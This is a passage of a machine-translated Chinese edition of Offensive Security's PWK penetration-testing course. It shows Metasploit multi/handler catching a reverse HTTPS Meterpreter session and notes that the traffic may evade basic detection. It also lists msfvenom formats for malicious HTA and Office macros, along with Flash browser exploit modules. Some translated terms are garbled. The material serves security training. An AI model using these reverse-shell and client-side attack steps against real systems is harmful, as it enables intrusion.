<div style="position:absolute;top:97462;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令允许我们查看正在运行的后台作业。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:97591;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="83"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 83 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:97624;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:98701;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:98701;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:98701;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">700</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:97722;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用 -j</font></font></font></b></nobr></div>
<div style="position:absolute;top:97739;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 作为后台作业 1 运行的漏洞利用。</font></font></nobr></div>
<div style="position:absolute;top:97773;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 在 https://10.11.0.4:443 上启动 HTTP 反向处理程序</font></font></nobr></div>
<div style="position:absolute;top:97807;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作业</font></font></font></b></nobr></div>
<div style="position:absolute;top:97840;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">职位</font></font></nobr></div>
<div style="position:absolute;top:97857;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">====</font></font></nobr></div>
<div style="position:absolute;top:97892;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">身份证名称    </font></font></nobr></div>
<div style="position:absolute;top:97892;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷    </font></font></nobr></div>
<div style="position:absolute;top:97892;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷选择</font></font></nobr></div>
<div style="position:absolute;top:97909;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- - -    </font></font></nobr></div>
<div style="position:absolute;top:97909;left:352"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-------    </font></font></nobr></div>
<div style="position:absolute;top:97909;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">------------</font></font></nobr></div>
<div style="position:absolute;top:97925;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0 利用：multi/handler windows/meterpreter/reverse_https https://10.11.0.4:443</font></font></nobr></div>
<div style="position:absolute;top:97959;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作业 -i 0</font></font></font></b></nobr></div>
<div style="position:absolute;top:97993;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称：Generic Payload Handler，开始于2019-08-16 07:23:22 -0400</font></font></nobr></div>
<div style="position:absolute;top:98027;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">杀死 0</font></font></font></b></nobr></div>
<div style="position:absolute;top:98044;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 停止以下作业：0</font></font></nobr></div>
<div style="position:absolute;top:98061;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 停止作业 0</font></font></nobr></div>
<div style="position:absolute;top:98095;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt; </font></font></nobr></div>
<div style="position:absolute;top:98115;left:294"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 777 - 将 multi/handler 作为后台作业执行</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:98144;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">随着侦听器作为作业运行，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-i</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志</font><font style="vertical-align: inherit;">显示有关它的信息，</font><font style="vertical-align: inherit;">后跟</font></font></nobr></div>
<div style="position:absolute;top:98163;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作业 ID。</font><font style="vertical-align: inherit;">此外，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kill</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">后跟作业 ID</font><font style="vertical-align: inherit;">来终止</font><font style="vertical-align: inherit;">作业。</font></font></nobr></div>
<div style="position:absolute;top:98196;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此时，multi/handler 正在运行并侦听 HTTPS 反向负载连接。</font></font></nobr></div>
<div style="position:absolute;top:98216;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在，我们可以生成一个包含 windows/meterpreter/reverse_https 的新可执行文件</font></font></nobr></div>
<div style="position:absolute;top:98235;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷，在我们的 Windows 目标上执行它，我们的处理程序应该变得生动：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:98270;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt; </font></font></nobr></div>
<div style="position:absolute;top:98287;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] https://10.11.0.4:443 处理来自 10.11.0.22 的请求；</font><font style="vertical-align: inherit;">暂存 x86 有效负载 (18082</font></font></nobr></div>
<div style="position:absolute;top:98304;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter session 3 打开</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(10.11.0.4:443 -&gt; 10.11.0.22:51258)</font></font></nobr></div>
<div style="position:absolute;top:98338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt; </font></font></nobr></div>
<div style="position:absolute;top:98357;left:276"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 778 - 接受带有 multi/handler 的反向 Meterpreter</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:98386;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们在建立连接时监控它的网络流量，我们会看到它看起来像</font></font></nobr></div>
<div style="position:absolute;top:98406;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">像任何其他 HTTPS 连接一样，因此可能会逃避基本检测。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:98779;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="84"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 84 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:98812;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:99889;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:99889;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:99889;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">701</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:99227;left:332"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 313：我们在 Wireshark 中的 HTTPS 负载</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:99258;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.3.6</font></font></i></nobr></div>
<div style="position:absolute;top:99258;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户端攻击</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:99296;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Metasploit 框架还提供了许多有助于客户端攻击的功能，包括</font></font></nobr></div>
<div style="position:absolute;top:99316;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们已经探索过的各种可执行格式。</font><font style="vertical-align: inherit;">我们可以回顾其中的一些</font></font></nobr></div>
<div style="position:absolute;top:99335;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">带有</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">msfvenom</font></font></b><font style="vertical-align: inherit;">的</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-l 格式</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项的</font><font style="vertical-align: inherit;">可执行格式</font><font style="vertical-align: inherit;">：</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:99370;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom -l 格式</font></font></font></b></nobr></div>
<div style="position:absolute;top:99404;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">框架可执行格式 [--format &lt;value&gt;]</font></font></nobr></div>
<div style="position:absolute;top:99421;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================================================</font></font></nobr></div>
<div style="position:absolute;top:99455;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称</font></font></nobr></div>
<div style="position:absolute;top:99472;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----</font></font></nobr></div>
<div style="position:absolute;top:99489;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ASP</font></font></nobr></div>
<div style="position:absolute;top:99506;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">aspx</font></font></nobr></div>
<div style="position:absolute;top:99523;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">aspx-exe</font></font></nobr></div>
<div style="position:absolute;top:99540;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">轴 2</font></font></nobr></div>
<div style="position:absolute;top:99557;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dll</font></font></nobr></div>
<div style="position:absolute;top:99574;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">精灵</font></font></nobr></div>
<div style="position:absolute;top:99590;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">小精灵</font></font></nobr></div>
<div style="position:absolute;top:99607;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EXE文件</font></font></nobr></div>
<div style="position:absolute;top:99625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:99644;left:311"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 779 - msfvenom 的所有可用文件格式</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:99673;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTA-PSH</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VBA</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VBA-PSH</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">格式分别制作不同设计用于在客户端攻击</font></font></nobr></div>
<div style="position:absolute;top:99693;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分别用于 Word 或 Excel 文档的恶意 HTML 应用程序或 Office 宏。</font></font></nobr></div>
<div style="position:absolute;top:99725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MSF 还包含许多浏览器漏洞。</font><font style="vertical-align: inherit;">例如，我们可以搜索“flash”来显示</font></font></nobr></div>
<div style="position:absolute;top:99745;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">多个基于 Flash 的漏洞利用，如清单 780 所示。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:99779;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索闪存</font></font></font></b></nobr></div>
<div style="position:absolute;top:99797;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:99814;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用/多/浏览器/adobe_flash_hacking_team_uaf    </font></font></nobr></div>
<div style="position:absolute;top:99814;left:603"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2015-07-06 伟大的 Adob​​e</font></font></nobr></div>
<div style="position:absolute;top:99831;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Flash Player ByteArray 免费使用 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:99967;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="85"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 85 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:100000;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:101077;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:101077;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:101077;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">702</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:100096;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用/多/浏览器/adobe_flash_nellymoser_bof    </font></font></nobr></div>
<div style="position:absolute;top:100096;left:603"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2015-06-23 伟大的 Adob​​e</font></font></nobr></div>
<div style="position:absolute;top:100112;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Flash Player Nellymoser 音频解码缓冲区溢出</font></font></nobr></div>
<div style="position:absolute;top:100129;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用/多/浏览器/adobe_flash_net_connection_confusion 2015-03-12 伟大的 Adob​​e</font></font></nobr></div>
<div style="position:absolute;top:100146;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Flash Player NetConnection 类型混淆</font></font></nobr></div>
<div style="position:absolute;top:100164;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用/多/浏览器/adobe_flash_opaque_background_uaf 2015-07-06 伟大的 Adob​​e</font></font></nobr></div>
<div style="position:absolute;top:100180;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Flash opaqueBackground 使用 After Free</font></font></nobr></div>
<div style="position:absolute;top:100197;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用/多/浏览器/adobe_flash_pixel_bender_bof    </font></font></nobr></div>
<div style="position:absolute;top:100197;left:603"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2014-04-28 伟大的 Adob​​e</font></font></nobr></div>
<div style="position:absolute;top:100214;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Flash Player 着色器缓冲区溢出</font></font></nobr></div>
<div style="position:absolute;top:100231;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用/多/浏览器/adobe_flash_shader_drawing_fill    </font></font></nobr></div>
<div style="position:absolute;top:100231;left:603"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2015-05-12 伟大的 Adob​​e</font></font></nobr></div>
<div style="position:absolute;top:100248;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Flash Player 绘图填充着色器内存损坏</font></font></nobr></div>
<div style="position:absolute;top:100265;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用/多/浏览器/adobe_flash_shader_job_overflow    </font></font></nobr></div>
<div style="position:absolute;top:100265;left:603"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2015-05-12 伟大的 Adob​​e</font></font></nobr></div>
<div style="position:absolute;top:100282;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Flash Player ShaderJob 缓冲区溢出</font></font></nobr></div>
<div style="position:absolute;top:100299;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用/多/浏览器/adobe_flash_uncompress_zlib_uaf    </font></font></nobr></div>
<div style="position:absolute;top:100299;left:603"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2014-04-28 伟大的 Adob​​e</font></font></nobr></div>
<div style="position:absolute;top:100316;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Flash Player ByteArray UncompressViaZlibVariant 使用后免费</font></font></nobr></div>
<div style="position:absolute;top:100335;left:324"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 780 - Metasploit 中的 Adob​​e Flash 漏洞利用</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:100365;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然这些漏洞已经过验证并且大多数是稳定的，但由于</font></font></nobr></div>
<div style="position:absolute;top:100384;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开发浏览器漏洞利用的挑战越来越大。</font><font style="vertical-align: inherit;">如果我们发现一个目标运行旧的</font></font></nobr></div>
<div style="position:absolute;top:100404;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">带有未打补丁的浏览器的 Windows 7 等操作系统，这种类型的向量可能会提供</font></font></nobr></div>
<div style="position:absolute;top:100423;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开我们需要。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:100458;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22.3.7</font></font></i></nobr></div>
<div style="position:absolute;top:100458;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">高级功能和传输</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:100495;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">了解Metasploit Framework和meterpreter的基本功能</font></font></nobr></div>
<div style="position:absolute;top:100515;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷，我们可以继续更高级的选项，我们可以用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">show advanced</font></font></font></b></nobr></div>
<div style="position:absolute;top:100534;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font><font style="vertical-align: inherit;">让我们研究一些更有趣的选项。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:100569;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示高级</font></font></font></b></nobr></div>
<div style="position:absolute;top:100603;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块高级选项（exploit/multi/handler）：</font></font></nobr></div>
<div style="position:absolute;top:100637;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称    </font></font></nobr></div>
<div style="position:absolute;top:100637;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当前设置 需要 说明</font></font></nobr></div>
<div style="position:absolute;top:100654;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----    </font></font></nobr></div>
<div style="position:absolute;top:100654;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--------------- -------- -----------</font></font></nobr></div>
<div style="position:absolute;top:100671;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上下文信息文件    </font></font></nobr></div>
<div style="position:absolute;top:100671;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:100671;left:522"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含的信息文件 </font></font></nobr></div>
<div style="position:absolute;top:100688;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DisablePayloadHandler false    </font></font></nobr></div>
<div style="position:absolute;top:100688;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:100688;left:522"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">禁用 se 的处理程序代码</font></font></nobr></div>
<div style="position:absolute;top:100705;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EnableContextEncoding false    </font></font></nobr></div>
<div style="position:absolute;top:100705;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:100705;left:522"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">编码时使用瞬态上下文</font></font></nobr></div>
<div style="position:absolute;top:100722;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话退出    </font></font></nobr></div>
<div style="position:absolute;top:100722;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">真的    </font></font></nobr></div>
<div style="position:absolute;top:100722;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 在 ses 之后从漏洞利用中返回</font></font></nobr></div>
<div style="position:absolute;top:100738;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">监听器超时    </font></font></nobr></div>
<div style="position:absolute;top:100738;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0    </font></font></nobr></div>
<div style="position:absolute;top:100738;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:100738;left:522"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到 wa 的最大秒数</font></font></nobr></div>
<div style="position:absolute;top:100756;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">详细    </font></font></nobr></div>
<div style="position:absolute;top:100756;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">错误的    </font></font></nobr></div>
<div style="position:absolute;top:100756;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:100756;left:522"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启用详细状态消息</font></font></nobr></div>
<div style="position:absolute;top:100773;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工作空间    </font></font></nobr></div>
<div style="position:absolute;top:100773;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:100773;left:522"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定此 modu 的工作空间</font></font></nobr></div>
<div style="position:absolute;top:100790;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">延迟    </font></font></nobr></div>
<div style="position:absolute;top:100790;left:303"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0    </font></font></nobr></div>
<div style="position:absolute;top:100790;left:441"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:100790;left:522"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">等待时的额外延迟</font></font></nobr></div>
<div style="position:absolute;top:100840;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效负载高级选项（windows/meterpreter/reverse_https）：</font></font></nobr></div>
<div style="position:absolute;top:100875;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称    </font></font></nobr></div>
<div style="position:absolute;top:100875;left:263"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当前设置 需要 说明</font></font></nobr></div>
<div style="position:absolute;top:100891;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----    </font></font></nobr></div>
<div style="position:absolute;top:100891;left:263"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--------------- -------- -----------</font></font></nobr></div>
<div style="position:absolute;top:100908;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AutoLoadStdapi 真    </font></font></nobr></div>
<div style="position:absolute;top:100908;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 自动加载 Stdapi 扩展</font></font></nobr></div>
<div style="position:absolute;top:100925;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自动运行脚本    </font></font></nobr></div>
<div style="position:absolute;top:100925;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:100925;left:481"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在会话中自动运行的脚本</font></font></nobr></div>
<div style="position:absolute;top:100942;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自动系统信息真    </font></font></nobr></div>
<div style="position:absolute;top:100942;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 自动捕获系统信息</font></font></nobr></div>
<div style="position:absolute;top:100959;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AutoUnhookProcess false    </font></font></nobr></div>
<div style="position:absolute;top:100959;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 自动加载 unhook 扩展 </font></font></nobr></div>
<div style="position:absolute;top:100976;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:100996;left:321"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 781 - multi/handler 的高级选项 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:101155;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="86"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 86 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
